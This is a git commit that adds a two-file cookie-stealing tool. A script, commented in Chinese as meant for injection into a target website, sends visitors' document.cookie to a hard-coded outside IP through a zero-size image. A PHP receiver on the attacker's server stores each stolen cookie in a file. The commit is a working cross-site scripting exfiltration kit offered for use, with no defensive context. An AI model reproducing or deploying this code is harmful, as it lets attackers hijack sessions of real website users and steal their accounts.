6cc3fbb24a089846e0fec70142dd5073c541ab18
luoyangcheng <lyc163069@live.com>
2019-09-04 09:02:52 +0800

    cookie

---
+++ Tool/steal_cookie/cookie.js
@@ -0,0 +1,4 @@
+//此脚本要放入目标网站中
+<script>
+document.write('<img src="94.191.124.146/index.php?cookie='+document.cookie+'" width=0 height=0 />');
+</script>
---
+++ Tool/steal_cookie/index.php
@@ -0,0 +1,7 @@
+<?php
+#此脚本放在自己服务，用来接收cookie
+$cookie = $_GET['cookie'];
+file_put_contents("/luoyc/data.txt",serialize($cookie));
+$cookie = unserialize(file_get_contents("/luoyc/data.txt"));
+var_dump($cookie);
+?>
